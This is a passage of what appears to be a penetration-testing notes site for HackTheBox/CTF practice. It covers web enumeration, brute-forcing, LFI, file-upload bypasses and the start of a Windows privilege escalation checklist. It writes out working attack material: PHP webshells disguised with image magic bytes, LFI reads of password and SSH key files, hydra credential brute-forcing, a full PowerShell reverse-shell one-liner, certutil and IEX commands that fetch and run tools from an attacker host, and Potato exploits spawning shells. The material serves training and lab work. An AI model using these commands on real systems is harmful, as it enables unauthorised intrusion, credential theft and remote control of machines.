FUZZ.&lt;DOMAIN&gt;&quot; \\\n     -fs &lt;DEFAULT_SIZE&gt;\n</code></pre>\n<h3 id=\"recommended-wordlists-for-vhostsubdomain\">Recommended wordlists for vhost/subdomain</h3>\n<table>\n<thead>\n<tr>\n<th>Wordlist</th>\n<th>Path</th>\n<th>Use</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>subdomains-top1million-5000</td>\n<td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>\n<td>Quick scan</td>\n</tr>\n<tr>\n<td>subdomains-top1million-20000</td>\n<td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code></td>\n<td>In-depth</td>\n</tr>\n<tr>\n<td>subdomains-top1million-110000</td>\n<td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></td>\n<td>Complete</td>\n</tr>\n<tr>\n<td>bitquark-subdomains-top100000</td>\n<td><code>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></td>\n<td>Alternative</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"add-found-vhosts\">Add found vhosts</h3>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;&lt;TARGET_IP&gt;  found.domain.htb&quot;\n</code></pre>\n<hr>\n<h2 id=\"2-directory-file-bruteforce\">2 // Directory &amp; File Bruteforce</h2>\n<h3 id=\"dirsearch\">dirsearch</h3>\n<pre><code class=\"language-bash\">dirsearch -u http://&lt;TARGET&gt;/ -e php,html,txt,js,json,xml,bak,old,asp,aspx -o scan/dirsearch.txt\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-e php,html,...</code></td>\n<td>Extensions to test</td>\n</tr>\n<tr>\n<td><code>-x 403,404</code></td>\n<td>Exclude status codes</td>\n</tr>\n<tr>\n<td><code>-i 200,301</code></td>\n<td>Include only these status</td>\n</tr>\n<tr>\n<td><code>-w &lt;wordlist&gt;</code></td>\n<td>Custom wordlist</td>\n</tr>\n<tr>\n<td><code>--deep-recursive</code></td>\n<td>Deep recursion</td>\n</tr>\n<tr>\n<td><code>-t 50</code></td>\n<td>Threads</td>\n</tr>\n<tr>\n<td><code>--random-agent</code></td>\n<td>Random User-Agent</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"feroxbuster\">feroxbuster</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://&lt;TARGET&gt;/ \\\n            -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n            -x php,html,txt,js,json,bak \\\n            -o scan/ferox.txt\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-x php,html,...</code></td>\n<td>Extensions</td>\n</tr>\n<tr>\n<td><code>-C 403,404</code></td>\n<td>Filter status codes</td>\n</tr>\n<tr>\n<td><code>-n</code></td>\n<td>No recursion</td>\n</tr>\n<tr>\n<td><code>--depth 3</code></td>\n<td>Recursion depth</td>\n</tr>\n<tr>\n<td><code>-t 50</code></td>\n<td>Threads</td>\n</tr>\n<tr>\n<td><code>--filter-size &lt;n&gt;</code></td>\n<td>Filter by size</td>\n</tr>\n<tr>\n<td><code>-H \"Cookie: ...\"</code></td>\n<td>Custom header (authentication)</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"gobuster\">gobuster</h3>\n<pre><code class=\"language-bash\">gobuster dir -u http://&lt;TARGET&gt;/ \\\n             -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n             -x php,html,txt \\\n             -o scan/gobuster.txt\n</code></pre>\n<h3 id=\"ffuf-directory-fuzzing\">ffuf // Directory fuzzing</h3>\n<pre><code class=\"language-bash\">ffuf -u http://&lt;TARGET&gt;/FUZZ \\\n     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n     -mc 200,301,302,403 \\\n     -o scan/ffuf-dirs.json -of json\n</code></pre>\n<h3 id=\"ffuf-file-fuzzing-with-extensions\">ffuf // File fuzzing with extensions</h3>\n<pre><code class=\"language-bash\">ffuf -u http://&lt;TARGET&gt;/FUZZ \\\n     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\\n     -e .php,.html,.txt,.bak,.old,.conf \\\n     -mc 200,301,302 \\\n     -o scan/ffuf-files.json -of json\n</code></pre>\n<h3 id=\"recommended-wordlists-for-directoriesfiles\">Recommended wordlists for directories/files</h3>\n<table>\n<thead>\n<tr>\n<th>Wordlist</th>\n<th>Path</th>\n<th>Usage</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>raft-medium-directories</td>\n<td><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></td>\n<td>Directories (go-to)</td>\n</tr>\n<tr>\n<td>raft-medium-files</td>\n<td><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt</code></td>\n<td>Files</td>\n</tr>\n<tr>\n<td>directory-list-2.3-medium</td>\n<td><code>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></td>\n<td>Classic DirBuster</td>\n</tr>\n<tr>\n<td>common.txt</td>\n<td><code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></td>\n<td>Quick scan</td>\n</tr>\n<tr>\n<td>big.txt</td>\n<td><code>/usr/share/seclists/Discovery/Web-Content/big.txt</code></td>\n<td>Extensive</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"3-parameter-endpoint-discovery\">3 // Parameter &amp; Endpoint Discovery</h2>\n<h3 id=\"ffuf-parameter-fuzzing-get\">ffuf // Parameter fuzzing (GET)</h3>\n<pre><code class=\"language-bash\">ffuf -u &quot;http://&lt;TARGET&gt;/page?FUZZ=test&quot; \\\n     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\\n     -fs &lt;DEFAULT_SIZE&gt;\n</code></pre>\n<h3 id=\"ffuf-parameter-fuzzing-post\">ffuf // Parameter fuzzing (POST)</h3>\n<pre><code class=\"language-bash\">ffuf -u &quot;http://&lt;TARGET&gt;/page&quot; \\\n     -X POST \\\n     -d &quot;FUZZ=test&quot; \\\n     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\\n     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\\n     -fs &lt;DEFAULT_SIZE&gt;\n</code></pre>\n<h3 id=\"arjun-automatic-parameter-discovery\">arjun // Automatic parameter discovery</h3>\n<pre><code class=\"language-bash\">arjun -u http://&lt;TARGET&gt;/page -oJ scan/arjun.json\n</code></pre>\n<hr>\n<h2 id=\"4-technologies-and-cms\">4 // Technologies and CMS</h2>\n<h3 id=\"identification\">Identification</h3>\n<pre><code class=\"language-bash\">whatweb http://&lt;TARGET&gt;\nnikto -h http://&lt;TARGET&gt; -o scan/nikto.txt\n</code></pre>\n<h3 id=\"wordpress\">WordPress</h3>\n<pre><code class=\"language-bash\">wpscan --url http://&lt;TARGET&gt;/ --enumerate u,vp,vt,cb,dbe -o scan/wpscan.txt\nwpscan --url http://&lt;TARGET&gt;/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin\n</code></pre>\n<h3 id=\"login-panel-default-credentials\">Login panel // Default credentials</h3>\n<blockquote>\n<p><strong>Default Credentials</strong><br>\nAlways try common combinations before brute-forcing:\n<code>admin:admin</code>, <code>admin:password</code>, <code>admin:admin123</code>, <code>root:root</code>, <code>test:test</code>, <code>guest:guest</code></p>\n<p>Ref: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials</p>\n</blockquote>\n<hr>\n<h2 id=\"5-vulnerability-scanning\">5 // Vulnerability Scanning</h2>\n<h3 id=\"nuclei\">Nuclei</h3>\n<pre><code class=\"language-bash\">nuclei -u http://&lt;TARGET&gt;/ -o scan/nuclei.txt\nnuclei -u http://&lt;TARGET&gt;/ -t cves/ -severity critical,high -o scan/nuclei-cves.txt\n</code></pre>\n<h3 id=\"nikto\">nikto</h3>\n<pre><code class=\"language-bash\">nikto -h http://&lt;TARGET&gt; -o scan/nikto.txt\n</code></pre>\n<h3 id=\"sql-injection-sqlmap\">SQL Injection (sqlmap)</h3>\n<pre><code class=\"language-bash\"># GET parameter\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --dbs\n\n# POST con richiesta Burp salvata\nsqlmap -r request.txt --batch --dbs\n\n# Cookie-based\nsqlmap -u &quot;http://&lt;TARGET&gt;/page&quot; --cookie=&quot;session=abc&quot; --batch --dbs\n</code></pre>\n<hr>\n<h2 id=\"6-authentication-bruteforce\">6 // Authentication Bruteforce</h2>\n<h3 id=\"ffuf-login-bruteforce\">ffuf // Login bruteforce</h3>\n<pre><code class=\"language-bash\">ffuf -u http://&lt;TARGET&gt;/login \\\n     -X POST \\\n     -d &quot;username=admin&amp;password=FUZZ&quot; \\\n     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\\n     -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \\\n     -fc 401,403 \\\n     -fs &lt;FAIL_SIZE&gt;\n</code></pre>\n<h3 id=\"hydra\">hydra</h3>\n<pre><code class=\"language-bash\"># HTTP POST form\nhydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:Invalid&quot;\n\n# HTTP Basic Auth\nhydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; http-get /admin\n\n# SSH\nhydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"7-file-inclusion-path-traversal\">7 // File Inclusion &amp; Path Traversal</h2>\n<h3 id=\"lfi-local-file-inclusion\">LFI // Local File Inclusion</h3>\n<pre><code class=\"language-bash\"># Manual test\ncurl &quot;http://&lt;TARGET&gt;/page?file=../../../etc/passwd&quot;\ncurl &quot;http://&lt;TARGET&gt;/page?file=....//. ... // . ... //etc/passwd&quot;\n\n# ffuf LFI fuzzing\nffuf -u &quot;http://&lt;TARGET&gt;/page?file=FUZZ&quot; \\\n     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\\n     -fs &lt;DEFAULT_SIZE&gt;\n</code></pre>\n<h3 id=\"interesting-files-to-read-via-lfi\">Interesting files to read via LFI</h3>\n<table>\n<thead>\n<tr>\n<th>File</th>\n<th>Info</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>/etc/passwd</code></td>\n<td>Users</td>\n</tr>\n<tr>\n<td><code>/etc/shadow</code></td>\n<td>Hashes (rare)</td>\n</tr>\n<tr>\n<td><code>/etc/hostname</code></td>\n<td>Hostname</td>\n</tr>\n<tr>\n<td><code>/proc/self/environ</code></td>\n<td>Environment variables</td>\n</tr>\n<tr>\n<td><code>/var/log/apache2/access.log</code></td>\n<td>Log poisoning</td>\n</tr>\n<tr>\n<td><code>/home/&lt;user&gt;/.ssh/id_rsa</code></td>\n<td>SSH keys</td>\n</tr>\n<tr>\n<td><code>conf.php</code>, <code>wp-config.php</code>, <code>.env</code></td>\n<td>DB credentials</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"8-file-upload-bypass\">8 // File Upload Bypass</h2>\n<blockquote>\n<p><strong>Context</strong><br>\nWhen an application allows file uploads but implements filters (extension, MIME type, content), there are various techniques to bypass them and upload a webshell.</p>\n</blockquote>\n<h3 id=\"81-extension-bypass\">8.1 // Extension Bypass</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Alternative PHP Extensions</li>\n</ul>\n<pre><code>.php .php3 .php4 .php5 .php7 .phtml .phar .phps .pht .pgif .inc\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Alternative ASP Extensions</li>\n</ul>\n<pre><code>.asp .aspx .ashx .asmx .ascx .config .cshtml .shtml\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Alternative JSP Extensions</li>\n</ul>\n<pre><code>.jsp .jspx .jsw .jsv .jspf\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Case mixing</li>\n</ul>\n<pre><code>.pHp .PhP .PHP .Php\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Double extension (bypass on filter that checks only the last one)</li>\n</ul>\n<pre><code>shell.php.jpg\nshell.php.png\nshell.php.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Reversed double extension (bypass on filter that checks only the first one)</li>\n</ul>\n<pre><code>shell.jpg.php\nshell.png.php\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Null byte (PHP &lt; 5.3.4, old servers)</li>\n</ul>\n<pre><code>shell.php%00.jpg\nshell.php\\x00.jpg\nshell.php%00.png\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Final dot and space (Windows)</li>\n</ul>\n<pre><code>shell.php.\nshell.php (with space)\nshell.php...\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Semicolon (IIS)</li>\n</ul>\n<pre><code>shell.asp;.jpg\nshell.aspx;.png\n</code></pre>\n<h3 id=\"82-content-type-bypass\">8.2 // Content-Type Bypass</h3>\n<p>The server checks the <code>Content-Type</code> header in the multipart request. Modify in Burp:</p>\n<pre><code>Content-Type: image/jpeg\nContent-Type: image/png\nContent-Type: image/gif\n</code></pre>\n<p>Even if the file is <code>.php</code>, the server accepts it if the Content-Type is an image.</p>\n<h3 id=\"83-magic-bytes-file-signature\">8.3 // Magic Bytes (File Signature)</h3>\n<p>The server checks the first bytes of the file to verify it is a real image. Add the magic bytes at the beginning of the webshell:</p>\n<pre><code class=\"language-bash\"># GIF\necho -n 'GIF89a' &gt; shell.php.gif\necho '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' &gt;&gt; shell.php.gif\n\n# PNG\nprintf '\\x89PNG\\r\\n\\x1a\\n' &gt; shell.php.png\necho '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' &gt;&gt; shell.php.png\n\n# JPEG\nprintf '\\xFF\\xD8\\xFF\\xE0' &gt; shell.php.jpg\necho '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' &gt;&gt; shell.php.jpg\n</code></pre>\n<blockquote>\n<p><strong>GIF89a</strong><br>\n<code>GIF89a</code> is the simplest method — it is a readable ASCII string, no hex bytes needed. It works to bypass both the magic bytes check and <code>getimagesize()</code> in PHP.</p>\n</blockquote>\n<h3 id=\"84-combination-of-techniques\">8.4 // Combination of techniques</h3>\n<p>Often <strong>multiple bypasses simultaneously</strong> are needed. Example (as in Gym Management System):</p>\n<pre><code>Filename: shell.php.png          → double extension\nContent-Type: image/png          → valid MIME type\nBody: \\x89PNG... + &lt;?php ...&gt;    → magic bytes + webshell\n</code></pre>\n<h3 id=\"85-htaccess-upload-apache\">8.5 // .htaccess upload (Apache)</h3>\n<p>If you can upload a <code>.htaccess</code>, you can force Apache to execute any extension as PHP:</p>\n<pre><code># .htaccess\nAddType application/x-httpd-php .evil\n</code></pre>\n<p>Then upload <code>shell.evil</code> with the PHP code.</p>\n<h3 id=\"86-race-condition\">8.6 // Race condition</h3>\n<p>Some servers upload the file, then validate it, then delete it if invalid. If you are fast enough:</p>\n<pre><code class=\"language-bash\"># Continuous upload + continuous access in parallel\nwhile true; do curl -s -F 'file=@shell.php' http://&lt;TARGET&gt;/upload; done &amp;\nwhile true; do curl -s http://&lt;TARGET&gt;/uploads/shell.php?cmd=id; done\n</code></pre>\n<h3 id=\"87-polyglot-file\">8.7 // Polyglot file</h3>\n<p>A file that is both a valid image and executable PHP code:</p>\n<pre><code class=\"language-bash\"># Create with exiftool // inject PHP into the Comment field of a JPEG\nexiftool -Comment='&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' photo.jpg\nmv photo.jpg shell.php.jpg\n</code></pre>\n<h3 id=\"88-wordlist-extensions-for-fuzzing\">8.8 // Wordlist extensions for fuzzing</h3>\n<pre><code class=\"language-bash\"># Fuzz accepted extensions\nffuf -u &quot;http://&lt;TARGET&gt;/upload&quot; \\\n     -X POST \\\n     -F &quot;file=@shell.php;filename=shell.FUZZ&quot; \\\n     -w /usr/share/seclists/Fuzzing/extensions-most-common.txt \\\n     -fs &lt;FAIL_SIZE&gt;\n</code></pre>\n<hr>\n<h2 id=\"9-api-enumeration\">9 // API Enumeration</h2>\n<pre><code class=\"language-bash\"># Common endpoints\nffuf -u http://&lt;TARGET&gt;/api/FUZZ \\\n     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n     -mc 200,201,301,401,403\n\n# With version\nffuf -u http://&lt;TARGET&gt;/api/v1/FUZZ \\\n     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n</code></pre>\n<h3 id=\"swagger-openapi\">Swagger / OpenAPI</h3>\n<pre><code class=\"language-bash\">curl -s http://&lt;TARGET&gt;/swagger.json\ncurl -s http://&lt;TARGET&gt;/openapi.json\ncurl -s http://&lt;TARGET&gt;/api-docs\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Aero</td>\n<td>IIS hosting <code>.theme</code> upload — CVE-2023-38146 (ThemeBleed) → DLL injection RCE</td>\n</tr>\n<tr>\n<td>BoardLight</td>\n<td>Apache hosting Dolibarr on a discovered vhost — CVE-2023-30253 contact-form RCE</td>\n</tr>\n<tr>\n<td>Broker</td>\n<td>nginx in front of ActiveMQ — the RCE itself hits OpenWire on 61616, not the web port</td>\n</tr>\n<tr>\n<td>Buff</td>\n<td>Apache + Gym Management System — unauthenticated <code>.php</code> upload → RCE</td>\n</tr>\n<tr>\n<td>Clicker</td>\n<td>Custom PHP clicker game — mass-assignment SQLi at signup</td>\n</tr>\n<tr>\n<td>Codify</td>\n<td>Apache + Node/Express on 3000 — vm2 sandbox escape against the Node service</td>\n</tr>\n<tr>\n<td>Devvortex</td>\n<td>Apache hosting Joomla — vhost discovery finds the admin panel; CVE-2023-23752 dumps creds</td>\n</tr>\n<tr>\n<td>Editorial</td>\n<td>nginx — SSRF in book-cover upload exposes an internal Flask API</td>\n</tr>\n<tr>\n<td>Jarvis</td>\n<td>Apache hosting a hotel booking app + phpMyAdmin on port 64999</td>\n</tr>\n<tr>\n<td>Love</td>\n<td>Apache + Voting System — SSRF to staging vhost retrieves admin creds, then PHP file upload</td>\n</tr>\n<tr>\n<td>Mailing</td>\n<td>PHP page on hMailServer admin endpoint — LFI in <code>?file=</code> parameter</td>\n</tr>\n<tr>\n<td>Poison</td>\n<td>FreeBSD Apache — LFI in <code>listfiles.php</code> chained with log poisoning → PHP execution</td>\n</tr>\n<tr>\n<td>Popcorn</td>\n<td>Torrent Hoster app — file-upload MIME bypass → PHP RCE</td>\n</tr>\n<tr>\n<td>Remote</td>\n<td>Umbraco CMS — authenticated RCE through <code>/umbraco/RestServices/CodeSnippets</code></td>\n</tr>\n<tr>\n<td>Tartar Sauce</td>\n<td>WordPress with gwolle-gb plugin — RFI via <code>abspath</code> parameter</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Windows Privilege Escalation — Checklist",
      "slug": "windows-privilege-escalation-checklist",
      "date": "2026·02·22",
      "tags": [
        "htb",
        "privesc",
        "windows",
        "methodology",
        "enum"
      ],
      "desc": "Context Checklist for privilege escalation on Windows machines in an HTB/CTF context. Applicable from any non-privileged user (local user, service account, domain user). Available tools: winpeas, PowerUp, SharpUp, Seatbelt, accesschk, PowerView",
      "body": "<h1 id=\"windows-privilege-escalation-checklist\">Windows Privilege Escalation // Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nChecklist for privilege escalation on <strong>Windows</strong> machines in an HTB/CTF context.\nApplicable from any non-privileged user (local user, service account, domain user).\nAvailable tools: winpeas, PowerUp, SharpUp, Seatbelt, accesschk, PowerView</p>\n</blockquote>\n<hr>\n<h2 id=\"0-initial-setup\">0 // Initial Setup</h2>\n<h3 id=\"shell-stabilization\">Shell Stabilization</h3>\n<blockquote>\n<p><strong>Priority</strong><br>\nA webshell or raw shell is unstable and limited. Before enumerating, obtain an interactive shell.</p>\n</blockquote>\n<h4 id=\"option-1-netcat-reverse-shell\">Option 1 // Netcat reverse shell</h4>\n<pre><code class=\"language-bash\"># Attacker: listener with rlwrap for history and arrow keys\nrlwrap nc -nvlp 443\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: download nc64.exe and get reverse shell\ncertutil -urlcache -f http://LHOST/nc64.exe C:\\Windows\\Temp\\nc.exe\nC:\\Windows\\Temp\\nc.exe -e cmd LHOST 443\n</code></pre>\n<blockquote>\n<p><strong>Where to find nc64.exe</strong><br>\n<code>/usr/share/windows-resources/binaries/nc.exe</code> (Kali) or download <code>nc64.exe</code> from GitHub.</p>\n</blockquote>\n<h4 id=\"option-2-powershell-reverse-shell-without-additional-tools\">Option 2 // PowerShell reverse shell (without additional tools)</h4>\n<pre><code class=\"language-bash\"># Attacker\nrlwrap nc -nvlp 443\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: one-liner PowerShell (from webshell or cmd)\npowershell -e &lt;BASE64_PAYLOAD&gt;\n</code></pre>\n<p>Generate the base64 payload:</p>\n<pre><code class=\"language-bash\"># Generate with revshells.com or manually:\necho -n '$client = New-Object System.Net.Sockets.TCPClient(&quot;LHOST&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w0; echo\n</code></pre>\n<h4 id=\"option-3-evil-winrm-if-port-5985-is-open-and-you-have-credentials\">Option 3 // Evil-WinRM (if port 5985 is open and you have credentials)</h4>\n<pre><code class=\"language-bash\">evil-winrm -i &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'\n# Or with NTLM hash\nevil-winrm -i &lt;TARGET&gt; -u &lt;USER&gt; -H '&lt;NTLM_HASH&gt;'\n</code></pre>\n<blockquote>\n<p><strong>Evil-WinRM is the best choice</strong><br>\nFully interactive shell, integrated upload/download, native PowerShell support. Always use it when available.</p>\n</blockquote>\n<h4 id=\"option-4-conpty-shell-full-interactive-shell\">Option 4 // Conpty shell (full interactive shell)</h4>\n<pre><code class=\"language-bash\"># Attacker: listener with stty\nstty raw -echo; (stty size; cat) | nc -nvlp 443\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: run ConPtyShell\nIEX(IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-ConPtyShell.ps1')); Invoke-ConPtyShell LHOST 443\n</code></pre>\n<blockquote>\n<p><strong>ConPtyShell</strong><br>\nProvides a fully interactive Windows shell with tab completion, arrow keys, working Ctrl+C. Ref: https://github.com/antonioCoco/ConPtyShell</p>\n</blockquote>\n<h3 id=\"transfer-enumeration-tools\">Transfer Enumeration Tools</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Transfer winpeas, SharpUp, PowerUp to the target</li>\n</ul>\n<pre><code class=\"language-powershell\"># Via certutil\ncertutil -urlcache -f http://LHOST:8888/winpeas.exe C:\\Windows\\Temp\\winpeas.exe\n\n# Via PowerShell\nInvoke-WebRequest -Uri http://LHOST:8888/winpeas.exe -OutFile C:\\Windows\\Temp\\winpeas.exe\n\n# Via evil-winrm\nupload /path/to/winpeas.exe\nupload /path/to/SharpUp.exe\n\n# Via SMB share (see FileTransfer)\nnet use Z: \\\\LHOST\\share /user:user pass\ncopy Z:\\winpeas.exe C:\\Windows\\Temp\\winpeas.exe\n\n## 1 // System Information\n\n- [ ] OS, version, and architecture\n```cmd\nsysteminfo\nhostname\n</code></pre>\n<pre><code class=\"language-powershell\">[System.Environment]::OSVersion\nGet-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, OsArchitecture\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Installed hotfixes and patches</li>\n</ul>\n<pre><code class=\"language-cmd\">wmic qfe list brief\nsysteminfo | findstr /B /C:&quot;KB&quot;\n</code></pre>\n<pre><code class=\"language-powershell\">Get-HotFix | Sort-Object InstalledOn -Descending\n</code></pre>\n<blockquote>\n<p><strong>Missing Patches</strong><br>\nCompare installed hotfixes with known exploits. Old patches = potential kernel exploits.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Environment variables</li>\n</ul>\n<pre><code class=\"language-cmd\">set\n</code></pre>\n<pre><code class=\"language-powershell\">Get-ChildItem Env:\n</code></pre>\n<hr>\n<h2 id=\"2-users-and-groups\">2 // Users and Groups</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Current user and privileges</li>\n</ul>\n<pre><code class=\"language-cmd\">whoami\nwhoami /priv\nwhoami /groups\nwhoami /all\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List local users</li>\n</ul>\n<pre><code class=\"language-cmd\">net user\nnet user &lt;username&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Local groups and membership</li>\n</ul>\n<pre><code class=\"language-cmd\">net localgroup\nnet localgroup Administrators\nnet localgroup &quot;Remote Desktop Users&quot;\nnet localgroup &quot;Remote Management Users&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Domain users (if domain-joined)</li>\n</ul>\n<pre><code class=\"language-cmd\">net user /domain\nnet group &quot;Domain Admins&quot; /domain\n</code></pre>\n<blockquote>\n<p><strong>Dangerous Privileges</strong><br>\nCheck <code>whoami /priv</code> for:\n- <strong>SeImpersonatePrivilege</strong> → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)\n- <strong>SeAssignPrimaryTokenPrivilege</strong> → Potato attacks\n- <strong>SeBackupPrivilege</strong> → Read any file (SAM, SYSTEM)\n- <strong>SeRestorePrivilege</strong> → Write any file\n- <strong>SeDebugPrivilege</strong> → Dump LSASS, inject in processes\n- <strong>SeTakeOwnershipPrivilege</strong> → Take ownership of files/registry\n- <strong>SeLoadDriverPrivilege</strong> → Load kernel drivers</p>\n</blockquote>\n<hr>\n<h2 id=\"3-seimpersonateprivilege-potato-attacks\">3 // SeImpersonatePrivilege // Potato Attacks</h2>\n<blockquote>\n<p><strong>When to apply</strong><br>\nIf <code>whoami /priv</code> shows <strong>SeImpersonatePrivilege</strong> (common for service accounts like <code>IIS APPPOOL</code>, <code>NT AUTHORITY\\LOCAL SERVICE</code>, <code>NETWORK SERVICE</code>).</p>\n</blockquote>\n<h3 id=\"printspoofer-windows-10-server-2016-2019\">PrintSpoofer (Windows 10 / Server 2016-2019)</h3>\n<pre><code class=\"language-cmd\">PrintSpoofer.exe -i -c &quot;cmd /c whoami&quot;\nPrintSpoofer.exe -i -c &quot;powershell -e &lt;BASE64_REVSHELL&gt;&quot;\n</code></pre>\n<h3 id=\"godpotato-universal-most-recent\">GodPotato (universal, most recent)</h3>\n<pre><code class=\"language-cmd\">GodPotato.exe -cmd &quot;cmd /c whoami&quot;\nGodPotato.exe -cmd &quot;cmd /c C:\\Users\\Public\\nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe&quot;\n</code></pre>\n<h3 id=\"juicypotato-windows-10-1809-server-2016\">JuicyPotato (Windows 10 &lt; 1809 / Server 2016)</h3>\n<pre><code class=\"language-cmd\">JuicyPotato.exe -l 1337 -p cmd.exe -a &quot;/c whoami&quot; -t *\n</code></pre>\n<h3 id=\"sweetpotato\">SweetPotato</h3>\n<pre><code class=\"language-cmd\">SweetPotato.exe -p cmd.exe -a &quot;/c whoami&quot;\n</code></pre>\n<blockquote>\n<p><strong>Which Potato to use</strong><br>\n- <strong>GodPotato</strong> — first choice, works on all recent versions\n- 